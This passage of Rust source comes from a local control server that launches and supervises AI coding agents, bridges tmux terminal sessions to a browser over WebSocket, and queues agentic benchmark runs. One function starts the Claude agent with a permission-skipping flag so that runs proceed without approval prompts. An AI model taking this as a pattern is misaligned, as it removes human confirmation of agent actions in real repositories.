        Ok(id) => id,
        Err(e) => return json_err(axum::http::StatusCode::BAD_REQUEST, &e),
    };
    let mut agents = load_agents();
    let Some(pos) = agents.iter().position(|a| a.id == id) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "no such agent");
    };
    let a = agents.remove(pos);
    unsafe { libc::kill(a.pid as libc::pid_t, libc::SIGTERM); }
    save_agents(&agents);
    axum::Json(serde_json::json!({ "ok": true, "id": a.id })).into_response()
}

#[derive(Deserialize)]
struct TaskReq {
    room: String,
    text: String,
    #[serde(default)]
    to: String,
}

async fn task_route(axum::Json(req): axum::Json<TaskReq>) -> axum::response::Response {
    use axum::response::IntoResponse;
    let room = req.room.trim();
    let text = req.text.trim();
    if room.is_empty() || text.is_empty() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "room and text required");
    }
    // Prefix @handle so a `mention`-policy agent fires on the task.
    let msg = if req.to.trim().is_empty() { text.to_string() } else { format!("@{} {}", req.to.trim(), text) };
    let (ok, out) = run_rozum(&["meetings", "post", "--room", room, &msg]);
    if ok {
        axum::Json(serde_json::json!({ "ok": true })).into_response()
    } else {
        json_err(axum::http::StatusCode::BAD_GATEWAY, out.trim())
    }
}

/// The model's admission verdict (for a 409 body): its estimated footprint vs the live ledger.
fn footprint_report(model: &str) -> serde_json::Value {
    let report = crate::share::dry_run_admission(footprint_for(model));
    serde_json::json!({
        "footprint_bytes": report.footprint,
        "available_bytes": report.available,
        "budget_bytes": report.budget,
        "fits": report.admit,
        "ledger_fits": report.ledger_fits,
        "ram_fits": report.ram_fits,
        "pressure_ok": report.pressure_ok,
    })
}

/// Estimate a model's resident footprint from its catalog weight size at a conservative ctx.
fn footprint_for(model: &str) -> u64 {
    let weight = rozum_models::models::scan_all_installed()
        .into_iter()
        .find(|m| m.spec == model)
        .map(|m| m.size_bytes)
        .unwrap_or(0);
    rozum_models::model_source::runtime_footprint_bytes(model, 8192, weight)
}

/// Derive the roster handle the participant uses, mirroring `model_participant::derive_handle` (the
/// short family name after the last `:` / `/`, before the first `-`), so the UI can @mention it.
fn derive_handle(model: &str) -> String {
    let tail = model.rsplit(['/', ':']).next().unwrap_or(model);
    let base = tail.split('-').next().unwrap_or(tail);
    base.to_lowercase()
}

fn json_err(code: axum::http::StatusCode, msg: &str) -> axum::response::Response {
    use axum::response::IntoResponse;
    (code, axum::Json(serde_json::json!({ "ok": false, "error": msg }))).into_response()
}

fn parse_action_json<T: DeserializeOwned>(body: &str) -> Result<T, String> {
    serde_json::from_str::<T>(body.trim()).map_err(|e| format!("invalid JSON body: {e}"))
}

#[derive(Deserialize)]
struct IdBody {
    id: String,
}

fn parse_id_body(body: &str) -> Result<String, String> {
    let body = body.trim();
    if body.is_empty() {
        return Err("id required".into());
    }
    if body.starts_with('{') || body.starts_with('[') {
        let req: IdBody =
            serde_json::from_str(body).map_err(|e| format!("invalid JSON body: {e}"))?;
        let id = req.id.trim().to_string();
        if id.is_empty() {
            return Err("id required".into());
        }
        return Ok(id);
    }
    for (k, v) in url::form_urlencoded::parse(body.as_bytes()) {
        if k == "id" {
            let id = v.trim().to_string();
            if id.is_empty() {
                return Err("id required".into());
            }
            return Ok(id);
        }
    }
    Ok(body.to_string())
}

fn parse_project_add_body(body: &str) -> Result<ProjectAddRequest, String> {
    let body = body.trim();
    if body.is_empty() {
        return Err("name required".into());
    }
    if body.starts_with('{') || body.starts_with('[') {
        let req: ProjectAddRequest =
            serde_json::from_str(body).map_err(|e| format!("invalid JSON body: {e}"))?;
        return Ok(req);
    }
    for (k, v) in url::form_urlencoded::parse(body.as_bytes()) {
        if k == "name" {
            return Ok(ProjectAddRequest { name: v.into_owned() });
        }
    }
    Ok(ProjectAddRequest { name: body.to_string() })
}

// ── Phase 2: coding-agents (`rozum launch`) — detached supervisor + log ─────────────────────────────
//
// A coding-agent does real file work in a repo. `rozum launch` is foreground (it execs the agent), so
// we spawn `rozum launch --model … <agent> <prompt>` DETACHED in the chosen workdir, with output → a
// per-run log file, and track it in a coders registry. Admission is enforced up front (ensure_gateway),
// and `rozum launch` then reuses that same shared gateway.

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoderRecord {
    pub id: String,
    pub agent: String,
    pub model: String,
    pub workdir: String,
    pub prompt: String,
    pub log: String,
    pub pid: u32,
    pub started_at: u64,
}

#[derive(Debug, Clone, Serialize)]
pub struct CoderBrief {
    pub id: String,
    pub agent: String,
    pub model: String,
    pub workdir: String,
    pub prompt: String,
    pub pid: u32,
    pub alive: bool,
}

fn coders_registry_path() -> Option<PathBuf> {
    state_dir().map(|d| d.join("ucc-coders.json"))
}

fn load_coders() -> Vec<CoderRecord> {
    coders_registry_path()
        .and_then(|p| std::fs::read(p).ok())
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default()
}

fn save_coders(coders: &[CoderRecord]) {
    if let Some(p) = coders_registry_path() {
        if let Some(dir) = p.parent() {
            let _ = std::fs::create_dir_all(dir);
        }
        if let Ok(body) = serde_json::to_vec_pretty(coders) {
            let tmp = p.with_extension("json.tmp");
            if std::fs::write(&tmp, &body).is_ok() {
                let _ = std::fs::rename(&tmp, &p);
            }
        }
    }
}

/// Running coders with a fresh liveness check; coders that have exited STAY in the registry (so their
/// log is still reachable) but report `alive=false`. The UI lets the operator clear a finished one.
fn live_coders() -> Vec<CoderBrief> {
    load_coders()
        .into_iter()
        .map(|c| CoderBrief {
            alive: pid_alive(c.pid),
            id: c.id, agent: c.agent, model: c.model, workdir: c.workdir, prompt: c.prompt, pid: c.pid,
        })
        .collect()
}

/// The agent's own invocation for a non-interactive run: program + flags + the task prompt. claude runs
/// autonomously (skip-permissions + a turn cap) so it never blocks on a phone-launched run.
fn agent_invocation(agent: &str, prompt: &str) -> Vec<String> {
    match agent {
        "claude" => vec![
            "claude".into(), "-p".into(), prompt.into(),
            "--dangerously-skip-permissions".into(), "--max-turns".into(), "40".into(),
        ],
        "codex" => vec!["codex".into(), "exec".into(), prompt.into()],
        "opencode" => vec!["opencode".into(), "run".into(), prompt.into()],
        other => vec![other.into(), prompt.into()],
    }
}

/// Spawn `rozum launch --model <m> <agent invocation>` DETACHED in `workdir`, output → a log file.
/// Returns (pid, log_path).
fn spawn_coder(agent: &str, model: &str, workdir: &str, prompt: &str) -> std::io::Result<(u32, PathBuf)> {
    use std::os::unix::process::CommandExt;
    let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("rozum"));
    let log_dir = state_dir().map(|d| d.join("logs")).unwrap_or_else(|| PathBuf::from("/tmp"));
    let _ = std::fs::create_dir_all(&log_dir);
    let stamp = crate::share::now_unix();
    let log_path = log_dir.join(format!("coder-{}-{}.log", sanitize(agent), stamp));
    let log = std::fs::OpenOptions::new().create(true).append(true).open(&log_path)?;
    let log2 = log.try_clone()?;
    let mut args: Vec<String> = vec!["launch".into(), "--model".into(), model.into()];
    args.extend(agent_invocation(agent, prompt));
    let mut cmd = Command::new(&exe);
    cmd.args(&args)
        .current_dir(workdir)
        .stdin(Stdio::null())
        .stdout(Stdio::from(log))
        .stderr(Stdio::from(log2))
        .process_group(0);
    Ok((cmd.spawn()?.id(), log_path))
}

#[derive(Deserialize)]
struct CoderLaunchReq {
    agent: String,
    model: String,
    workdir: String,
    prompt: String,
}

async fn coder_launch_route(body: String) -> axum::response::Response {
    use axum::response::IntoResponse;
    let req: CoderLaunchReq = match parse_action_json(&body) {
        Ok(req) => req,
        Err(e) => return json_err(axum::http::StatusCode::BAD_REQUEST, &e),
    };
    let agent = req.agent.trim().to_string();
    let model = req.model.trim().to_string();
    let workdir = req.workdir.trim().to_string();
    let prompt = req.prompt.trim().to_string();
    if agent.is_empty() || model.is_empty() || workdir.is_empty() || prompt.is_empty() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "agent, model, workdir, prompt required");
    }
    if !std::path::Path::new(&workdir).is_dir() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "workdir is not a directory");
    }
    // Admission-gate the model load up front; `rozum launch` then reuses this shared gateway.
    if let Err(e) = ensure_gateway(&model).await {
        return (
            axum::http::StatusCode::CONFLICT,
            axum::Json(serde_json::json!({ "ok": false, "error": e, "admission": footprint_report(&model) })),
        ).into_response();
    }
    match spawn_coder(&agent, &model, &workdir, &prompt) {
        Ok((pid, log)) => {
            let id = format!("{}-{}", sanitize(&agent), pid);
            let mut coders = load_coders();
            coders.push(CoderRecord {
                id: id.clone(), agent, model, workdir, prompt,
                log: log.to_string_lossy().into_owned(), pid, started_at: crate::share::now_unix(),
            });
            save_coders(&coders);
            axum::Json(serde_json::json!({ "ok": true, "id": id, "pid": pid })).into_response()
        }
        Err(e) => json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, &format!("spawn: {e}")),
    }
}

async fn coder_stop_route(body: String) -> axum::response::Response {
    use axum::response::IntoResponse;
    let id = match parse_id_body(&body) {
        Ok(id) => id,
        Err(e) => return json_err(axum::http::StatusCode::BAD_REQUEST, &e),
    };
    let mut coders = load_coders();
    let Some(pos) = coders.iter().position(|c| c.id == id) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "no such coder");
    };
    let c = coders.remove(pos);
    unsafe { libc::kill(c.pid as libc::pid_t, libc::SIGTERM); }
    save_coders(&coders);
    axum::Json(serde_json::json!({ "ok": true, "id": c.id })).into_response()
}

#[derive(Deserialize)]
struct CoderLogQuery {
    id: String,
    #[serde(default = "default_tail")]
    tail: usize,
}
fn default_tail() -> usize { 120 }

async fn coder_log_route(axum::extract::Query(q): axum::extract::Query<CoderLogQuery>) -> axum::response::Response {
    use axum::response::IntoResponse;
    let Some(c) = load_coders().into_iter().find(|c| c.id == q.id) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "no such coder");
    };
    let text = std::fs::read_to_string(&c.log).unwrap_or_default();
    let lines: Vec<&str> = text.lines().collect();
    let start = lines.len().saturating_sub(q.tail.min(2000));
    let tail = lines[start..].join("\n");
    axum::Json(serde_json::json!({ "id": c.id, "alive": pid_alive(c.pid), "log": tail })).into_response()
}

// ── Phase 4: live interactive terminal sessions (tmux + PTY ↔ WebSocket) ────────────────────────────
//
// A "session" is a coding-agent running INTERACTIVELY under a detached tmux session, so it survives the
// phone sleeping / the WS dropping. `POST /control/session/launch` creates the tmux session; the WS
// `GET /control/session/attach/:id` bridges a PTY running `tmux attach` to the browser xterm.js. tmux
// is the source of truth for liveness; a small registry holds display metadata.

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionRecord {
    pub id: String,
    pub agent: String,
    pub model: String,
    pub workdir: String,
    pub prompt: String,
    pub started_at: u64,
}

#[derive(Debug, Clone, Serialize)]
pub struct SessionBrief {
    pub id: String,
    pub agent: String,
    pub model: String,
    pub workdir: String,
    pub alive: bool,
}

fn sessions_registry_path() -> Option<PathBuf> {
    state_dir().map(|d| d.join("ucc-sessions.json"))
}
fn load_sessions() -> Vec<SessionRecord> {
    sessions_registry_path()
        .and_then(|p| std::fs::read(p).ok())
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default()
}
fn save_sessions(s: &[SessionRecord]) {
    if let Some(p) = sessions_registry_path() {
        if let Some(dir) = p.parent() { let _ = std::fs::create_dir_all(dir); }
        if let Ok(body) = serde_json::to_vec_pretty(s) {
            let tmp = p.with_extension("json.tmp");
            if std::fs::write(&tmp, &body).is_ok() { let _ = std::fs::rename(&tmp, &p); }
        }
    }
}
fn tmux_name(id: &str) -> String { format!("rozum-{id}") }

/// Does the tmux session exist? (`tmux has-session` exit 0). The liveness source of truth.
fn tmux_alive(id: &str) -> bool {
    Command::new("tmux").args(["has-session", "-t", &tmux_name(id)])
        .stdout(Stdio::null()).stderr(Stdio::null())
        .status().map(|s| s.success()).unwrap_or(false)
}

/// Running sessions (registry ∩ live tmux); prunes dead registry entries.
fn live_sessions() -> Vec<SessionBrief> {
    let all = load_sessions();
    let (alive, dead): (Vec<_>, Vec<_>) = all.into_iter().partition(|s| tmux_alive(&s.id));
    if !dead.is_empty() { save_sessions(&alive); }
    alive.into_iter()
        .map(|s| SessionBrief { id: s.id, agent: s.agent, model: s.model, workdir: s.workdir, alive: true })
        .collect()
}

#[derive(Deserialize)]
struct SessionLaunchReq {
    agent: String,
    model: String,
    workdir: String,
    #[serde(default)]
    prompt: String,
}

async fn session_launch_route(body: String) -> axum::response::Response {
    use axum::response::IntoResponse;
    let req: SessionLaunchReq = match parse_action_json(&body) {
        Ok(req) => req,
        Err(e) => return json_err(axum::http::StatusCode::BAD_REQUEST, &e),
    };
    let agent = req.agent.trim().to_string();
    let model = req.model.trim().to_string();
    let workdir = req.workdir.trim().to_string();
    if agent.is_empty() || model.is_empty() || workdir.is_empty() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "agent, model, workdir required");
    }
    // `agent`/`model` are interpolated into a shell-command string below (tmux `new-session`'s
    // trailing argument) — reject anything outside a safe charset instead of shell-escaping, so no
    // input can break out into arbitrary command execution.
    if !shell_safe(&agent) || !shell_safe(&model) {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "agent/model contain unsupported characters");
    }
    if !std::path::Path::new(&workdir).is_dir() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "workdir is not a directory");
    }
    // Admission-gate the model; `rozum launch` then reuses the shared gateway.
    if let Err(e) = ensure_gateway(&model).await {
        return (
            axum::http::StatusCode::CONFLICT,
            axum::Json(serde_json::json!({ "ok": false, "error": e, "admission": footprint_report(&model) })),
        ).into_response();
    }
    let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("rozum"));
    let id = format!("{}-{}", sanitize(&agent), crate::share::now_unix());
    let name = tmux_name(&id);
    // Interactive agent under a detached tmux session in the workdir.
    let inner = format!("{} launch --model {} {}", exe.to_string_lossy(), model, agent);
    let ok = Command::new("tmux")
        .args(["new-session", "-d", "-s", &name, "-c", &workdir, "-x", "120", "-y", "40", &inner])
        .status().map(|s| s.success()).unwrap_or(false);
    if !ok {
        return json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, "tmux new-session failed");
    }
    // Seed the task prompt into the interactive agent, if given.
    let prompt = req.prompt.trim().to_string();
    if !prompt.is_empty() {
        std::thread::sleep(std::time::Duration::from_millis(1500)); // let the agent's REPL come up
        let _ = Command::new("tmux").args(["send-keys", "-t", &name, &prompt, "Enter"]).status();
    }
    let mut sessions = load_sessions();
    sessions.push(SessionRecord {
        id: id.clone(), agent, model, workdir, prompt, started_at: crate::share::now_unix(),
    });
    save_sessions(&sessions);
    axum::Json(serde_json::json!({ "ok": true, "id": id })).into_response()
}

async fn session_stop_route(body: String) -> axum::response::Response {
    use axum::response::IntoResponse;
    let id = match parse_id_body(&body) {
        Ok(id) => id,
        Err(e) => return json_err(axum::http::StatusCode::BAD_REQUEST, &e),
    };
    let _ = Command::new("tmux").args(["kill-session", "-t", &tmux_name(&id)]).status();
    let mut sessions = load_sessions();
    sessions.retain(|s| s.id != id);
    save_sessions(&sessions);
    axum::Json(serde_json::json!({ "ok": true, "id": id })).into_response()
}

/// WS: bridge a PTY running `tmux attach -t rozum-<id>` to the browser terminal. Closing the WS ends the
/// ATTACH (the tmux session persists → reconnect re-attaches). Text frame `{"resize":{cols,rows}}` resizes.
async fn session_attach_route(
    ws: axum::extract::ws::WebSocketUpgrade,
    axum::extract::Path(id): axum::extract::Path<String>,
) -> axum::response::Response {
    if !tmux_alive(&id) {
        return json_err(axum::http::StatusCode::NOT_FOUND, "no such session");
    }
    ws.on_upgrade(move |socket| session_ws_bridge(socket, id))
}

async fn session_ws_bridge(mut socket: axum::extract::ws::WebSocket, id: String) {
    use axum::extract::ws::Message;
    use portable_pty::{native_pty_system, CommandBuilder, PtySize};
    use std::io::{Read, Write};

    let name = tmux_name(&id);
    let pty = native_pty_system();
    let pair = match pty.openpty(PtySize { rows: 40, cols: 120, pixel_width: 0, pixel_height: 0 }) {
        Ok(p) => p,
        Err(_) => return,
    };
    let mut cmd = CommandBuilder::new("tmux");
    cmd.args(["attach", "-t", &name]);
    let mut child = match pair.slave.spawn_command(cmd) {
        Ok(c) => c,
        Err(_) => return,
    };
    drop(pair.slave);
    let mut reader = match pair.master.try_clone_reader() { Ok(r) => r, Err(_) => return };
    let writer = match pair.master.take_writer() { Ok(w) => w, Err(_) => return };
    let writer = std::sync::Arc::new(std::sync::Mutex::new(writer));
    let master = pair.master;

    // PTY → channel (blocking std read on a worker thread).
    let (tx, mut rx) = tokio::sync::mpsc::channel::<Vec<u8>>(256);
    std::thread::spawn(move || {
        let mut buf = [0u8; 8192];
        loop {
            match reader.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => { if tx.blocking_send(buf[..n].to_vec()).is_err() { break; } }
            }
        }
    });

    loop {
        tokio::select! {
            out = rx.recv() => match out {
                Some(bytes) => { if socket.send(Message::Binary(bytes.into())).await.is_err() { break; } }
                None => break, // PTY closed (attach ended)
            },
            inc = socket.recv() => match inc {
                Some(Ok(Message::Binary(b))) => { let _ = writer.lock().unwrap().write_all(&b); }
                Some(Ok(Message::Text(t))) => {
                    let mut handled = false;
                    if let Ok(v) = serde_json::from_str::<serde_json::Value>(&t) {
                        if let Some(r) = v.get("resize") {
                            let cols = r.get("cols").and_then(|x| x.as_u64()).unwrap_or(120) as u16;
                            let rows = r.get("rows").and_then(|x| x.as_u64()).unwrap_or(40) as u16;
                            let _ = master.resize(PtySize { rows, cols, pixel_width: 0, pixel_height: 0 });
                            handled = true;
                        }
                    }
                    if !handled { let _ = writer.lock().unwrap().write_all(t.as_bytes()); }
                }
                Some(Ok(Message::Close(_))) | None | Some(Err(_)) => break,
                _ => {}
            },
        }
    }
    let _ = child.kill(); // end the `tmux attach` (NOT the session — it stays detached for reconnect)
}

// ── Matrix benchmark queue ────────────────────────────────────────────────────────────────────────────
//
// Manages a persistent in-memory queue of matrix benchmark jobs. Each job runs `agentic.sh` with
// scoped AGENTIC_MODELS / AGENTS / TASKS env vars. A background tokio task processes one job at a
// time; the frontend polls `/control/matrix/status` for queue state + the latest per-run.csv cells.

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
enum MatrixJobStatus { Queued, Running, Paused, Done, Failed, Stopped }

// Live state for the currently running matrix job (cleared when job finishes).
#[derive(Serialize, Deserialize, Clone)]
struct MatrixLive {
    job_id: String,
    pgid: i32,
    paused: bool,
    done: bool,       // true after exit, panel stays visible for DONE_TTL_SECS
    done_at: u64,
    started_at: u64,
    total_cells: usize,
    log_path: String,
    result_dir: String,
}
const DONE_TTL_SECS: u64 = 300; // keep panel visible 5 min after completion
/// Stale on-disk state older than this is ignored on startup (the job is long gone).
const LIVE_STALE_SECS: u64 = 1800;

fn matrix_live_path() -> Option<PathBuf> {
    state_dir().map(|d| d.join("matrix-live.json"))
}

fn persist_matrix_live(live: &Option<MatrixLive>) {
    let Some(path) = matrix_live_path() else { return };
    match live {
        None => { let _ = std::fs::remove_file(&path); }
        Some(l) => {
            if let Ok(bytes) = serde_json::to_vec(l) {
                let tmp = path.with_extension("json.tmp");
                if std::fs::write(&tmp, &bytes).is_ok() {
                    let _ = std::fs::rename(&tmp, &path);
                }
            }
        }
    }
}

fn load_matrix_live_from_disk() -> Option<MatrixLive> {
    let path = matrix_live_path()?;
    let bytes = std::fs::read(&path).ok()?;
    let l: MatrixLive = serde_json::from_slice(&bytes).ok()?;
    // Ignore stale state: done jobs older than LIVE_STALE_SECS, or in-progress jobs
    // from a previous process that is no longer running (pgid dead).
    let now = crate::share::now_unix();
    if l.done && now.saturating_sub(l.done_at) > LIVE_STALE_SECS {
        return None;
    }
    // For in-progress jobs, check if the process group is still alive.
    if !l.done {
        let alive = unsafe { libc::kill(-l.pgid, 0) } == 0;
        if !alive {
            return None;
        }
    }
    Some(l)
}

fn matrix_live() -> &'static Mutex<Option<MatrixLive>> {
    use std::sync::OnceLock;
    static L: OnceLock<Mutex<Option<MatrixLive>>> = OnceLock::new();
    L.get_or_init(|| Mutex::new(load_matrix_live_from_disk()))
}

fn matrix_live_data() -> serde_json::Value {
    let live = matrix_live().lock().unwrap();
    let Some(ref l) = *live else {
        return serde_json::json!({ "status": "idle" });
    };
    let now = crate::share::now_unix();
    // If job finished and TTL has expired, treat as idle
    if l.done && now.saturating_sub(l.done_at) > DONE_TTL_SECS {
        drop(live);
        let cleared = None;
        persist_matrix_live(&cleared);
        *matrix_live().lock().unwrap() = cleared;
        return serde_json::json!({ "status": "idle" });
    }
    let elapsed_s = if l.done { l.done_at.saturating_sub(l.started_at) } else { now.saturating_sub(l.started_at) };
    // Count done cells from partial CSV
    let result_path = PathBuf::from(&l.result_dir).join("per-run.csv");
    let done = parse_matrix_csv(&result_path).len();
    // Log tail
    let log_tail = std::fs::read_to_string(&l.log_path).unwrap_or_default();
    let tail_lines: Vec<&str> = log_tail.lines()
        .filter(|l| !l.trim().is_empty())
        .collect();
    let tail_start = tail_lines.len().saturating_sub(8);
    let log_recent = tail_lines[tail_start..].join("\n");
    // Current task hint: prefer model/agent/task lines (contain "/"), fall back to TASK keyword lines
    let current_hint = if l.done {
        String::new()
    } else {
        tail_lines.iter().rev()
            .find(|l| {
                let t = l.trim();
                !t.chars().all(|c| c == '=' || c == ' ' || c == '-')
                    && (t.contains('/') || t.contains("TASK") || t.contains("task"))
            })
            .map(|s| s.trim().trim_matches('=').trim().to_string())
            .unwrap_or_default()
    };
    // Memory from residency
    let report = crate::share::dry_run_admission(0);
    let available_gib = report.available.unwrap_or(0) as f64 / 1024.0 / 1024.0 / 1024.0;
    let committed_gib = report.in_use as f64 / 1024.0 / 1024.0 / 1024.0;
    let status = if l.done { "done" } else if l.paused { "paused" } else { "running" };
    serde_json::json!({
        "status": status,
        "elapsed_s": elapsed_s,
        "started_at": l.started_at,
        "progress": { "done": done, "total": l.total_cells },
        "memory": { "available_gib": (available_gib * 10.0).round() / 10.0,
                    "committed_gib": (committed_gib * 10.0).round() / 10.0 },
        "current_hint": current_hint,
        "log_tail": log_recent,
    })
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct MatrixJob {
    id: String,
    models: Option<Vec<String>>,
    agents: Option<Vec<String>>,
    tasks: Option<Vec<String>>,
    /// REPS: how many runs per cell (default 1 = single-run pass/fail).
    #[serde(default)]
    reps: Option<u32>,
    status: MatrixJobStatus,
    queued_at: u64,
    started_at: Option<u64>,
    finished_at: Option<u64>,
    log_path: Option<String>,
    result_dir: Option<String>,
    exit_code: Option<i32>,
}

fn matrix_queue() -> &'static Mutex<Vec<MatrixJob>> {
    use std::sync::OnceLock;
    static Q: OnceLock<Mutex<Vec<MatrixJob>>> = OnceLock::new();
    Q.get_or_init(|| Mutex::new(Vec::new()))
}

fn matrix_notify() -> &'static tokio::sync::Notify {
    use std::sync::OnceLock;
    static N: OnceLock<tokio::sync::Notify> = OnceLock::new();
    N.get_or_init(tokio::sync::Notify::new)
}

fn bench_script() -> PathBuf {
    std::env::current_dir().unwrap_or_default().join("scripts/bench/agentic.sh")
}

fn bench_results_dir() -> PathBuf {
    std::env::current_dir().unwrap_or_default().join("scripts/bench/results")
}

fn latest_matrix_result() -> Option<(String, PathBuf)> {
    let dir = bench_results_dir();
    let mut entries: Vec<_> = std::fs::read_dir(&dir).ok()?
        .filter_map(|e| e.ok())
        .filter(|e| {
            let n = e.file_name().to_string_lossy().to_string();
            // only directories named agentic-*, skip .console/.log files
            n.starts_with("agentic-") && !n.contains('.')
        })
        .filter(|e| e.path().join("per-run.csv").exists())
        .collect();
    entries.sort_by_key(|e| {
        e.metadata().and_then(|m| m.modified()).ok()
    });
    let last = entries.last()?;
    let stamp = last.file_name().to_string_lossy().to_string();
    Some((stamp, last.path().join("per-run.csv")))
}

fn parse_matrix_csv(csv_path: &PathBuf) -> Vec<serde_json::Value> {
    let text = match std::fs::read_to_string(csv_path) { Ok(t) => t, Err(_) => return vec![] };
    let mut lines = text.lines();
    let header: Vec<String> = match lines.next() {
        Some(h) => h.split(',').map(|s| s.to_string()).collect(),
        None => return vec![],
    };
    lines.filter(|l| !l.trim().is_empty()).map(|line| {
        let vals: Vec<&str> = line.split(',').collect();
        let mut obj = serde_json::Map::new();
        for (i, key) in header.iter().enumerate() {
            let v = vals.get(i).copied().unwrap_or("");
            if let Ok(n) = v.parse::<i64>() {
                obj.insert(key.clone(), serde_json::json!(n));
            } else if let Ok(f) = v.parse::<f64>() {
                obj.insert(key.clone(), serde_json::json!(f));
            } else {
                obj.insert(key.clone(), serde_json::json!(v));
            }
        }
        serde_json::Value::Object(obj)
    }).collect()
}

async fn matrix_status_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let queue: Vec<MatrixJob> = matrix_queue().lock().unwrap().clone();
    let last = latest_matrix_result().map(|(stamp, csv)| {
        let cells = parse_matrix_csv(&csv);
        let total = cells.len();
        let passed = cells.iter()
            .filter(|c| c.get("pass").and_then(|v| v.as_i64()).unwrap_or(0) == 1)
            .count();
        serde_json::json!({ "stamp": stamp, "cells": cells, "total": total, "passed": passed })
    });
    let installed: Vec<String> = rozum_models::models::scan_all_installed()
        .into_iter().map(|m| m.spec).collect();
    axum::Json(serde_json::json!({ "queue": queue, "last": last, "installed": installed })).into_response()
}

#[derive(Deserialize)]
struct MatrixRunReq {
    models: Option<Vec<String>>,
    agents: Option<Vec<String>>,
    tasks: Option<Vec<String>>,
    /// REPS: how many times to repeat each cell (default 1). Passed as REPS=N to agentic.sh.
    #[serde(default)]
    reps: Option<u32>,
}

async fn matrix_run_route(axum::Json(req): axum::Json<MatrixRunReq>) -> axum::response::Response {
    use axum::response::IntoResponse;
    let id = format!("job-{}", crate::share::now_unix());
    let job = MatrixJob {
        id: id.clone(),
        models: req.models,
        agents: req.agents,
        tasks: req.tasks,
        reps: req.reps,
        status: MatrixJobStatus::Queued,
        queued_at: crate::share::now_unix(),
        started_at: None, finished_at: None, log_path: None, result_dir: None, exit_code: None,
    };
    matrix_queue().lock().unwrap().push(job);
    matrix_notify().notify_one();
    axum::Json(serde_json::json!({ "ok": true, "id": id })).into_response()
}

#[derive(Deserialize)]
struct MatrixLogQuery { job_id: String, #[serde(default = "default_tail")] tail: usize }

async fn matrix_log_route(axum::extract::Query(q): axum::extract::Query<MatrixLogQuery>) -> axum::response::Response {
    use axum::response::IntoResponse;
    let log_path = matrix_queue().lock().unwrap()
        .iter().find(|j| j.id == q.job_id)
        .and_then(|j| j.log_path.clone());
    match log_path {
        None => json_err(axum::http::StatusCode::NOT_FOUND, "no log for job"),
        Some(path) => {
            let text = std::fs::read_to_string(&path).unwrap_or_default();
            let lines: Vec<&str> = text.lines().collect();
            let start = lines.len().saturating_sub(q.tail.min(2000));
            axum::Json(serde_json::json!({ "log": lines[start..].join("\n") })).into_response()
        }
    }
}

async fn matrix_worker() {
    loop {
        matrix_notify().notified().await;
        loop {
            let job_id = {
                let mut q = matrix_queue().lock().unwrap();
                q.iter().position(|j| j.status == MatrixJobStatus::Queued)
                    .map(|i| {
                        q[i].status = MatrixJobStatus::Running;
                        q[i].started_at = Some(crate::share::now_unix());
                        q[i].id.clone()
                    })
            };
            let Some(id) = job_id else { break };
            run_matrix_job(&id).await;
        }
    }
}

async fn run_matrix_job(job_id: &str) {
    let (models, agents, tasks, reps) = {
        let q = matrix_queue().lock().unwrap();
        let Some(j) = q.iter().find(|j| j.id == job_id) else { return };
        (j.models.clone(), j.agents.clone(), j.tasks.clone(), j.reps.unwrap_or(1))
    };

    let log_dir = state_dir().map(|d| d.join("matrix-logs")).unwrap_or_else(|| PathBuf::from("/tmp"));
    let _ = std::fs::create_dir_all(&log_dir);
    let log_path = log_dir.join(format!("{job_id}.log"));

    let stamp = crate::share::now_unix();
    let result_dir = bench_results_dir().join(format!("agentic-ucc-{stamp}"));
    let _ = std::fs::create_dir_all(&result_dir);

    {
        let mut q = matrix_queue().lock().unwrap();
        if let Some(j) = q.iter_mut().find(|j| j.id == job_id) {
            j.log_path = Some(log_path.to_string_lossy().into_owned());
            j.result_dir = Some(result_dir.to_string_lossy().into_owned());
        }
    }

    let log_out = match std::fs::OpenOptions::new().create(true).append(true).open(&log_path) {
        Ok(f) => f, Err(_) => { matrix_fail(job_id); return; }
    };
    let log_err = match log_out.try_clone() { Ok(f) => f, Err(_) => { matrix_fail(job_id); return; } };

    let all_models: Vec<String> = rozum_models::models::scan_all_installed().into_iter().map(|m| m.spec).collect();
    let models_vec = models.unwrap_or(all_models);
    let agents_vec = agents.unwrap_or_else(|| vec!["claude".into(), "codex".into(), "opencode".into()]);
    let tasks_vec  = tasks.unwrap_or_else(|| vec!["greet".into(), "build".into(), "fix".into(), "test".into(), "debug".into(), "rpn".into()]);
    let total_cells = models_vec.len() * agents_vec.len() * tasks_vec.len() * reps as usize;
    let models_str = models_vec.join(" ");
    let agents_str = agents_vec.join(" ");
    let tasks_str  = tasks_vec.join(" ");

    let started_at = {
        let q = matrix_queue().lock().unwrap();
        q.iter().find(|j| j.id == job_id).and_then(|j| j.started_at).unwrap_or_else(crate::share::now_unix)
    };

    use std::os::unix::process::CommandExt as _;
    let mut cmd = Command::new("bash");
    cmd.arg(bench_script())
        .env("AGENTIC_MODELS", &models_str)
        .env("AGENTS", &agents_str)
        .env("TASKS", &tasks_str)
        .env("BENCH_OUT", &result_dir)
        .env("ROZUM_SAMPLING_SEED", "1234")
        .env("KEEP", "1") // preserve workdirs so we can archive cell logs
        .env("REPS", reps.to_string())
        .env("REPAIR", "1") // one verify-repair retry: feeds real compiler error back on first fail
        .env("GEN_TIMEOUT", "120") // 120s per-generation; frozen model fails fast, leaves room for retry
        .stdin(Stdio::null())
        .stdout(Stdio::from(log_out))
        .stderr(Stdio::from(log_err))
        .process_group(0);

    let exit_code = match cmd.spawn() {
        Ok(mut child) => {
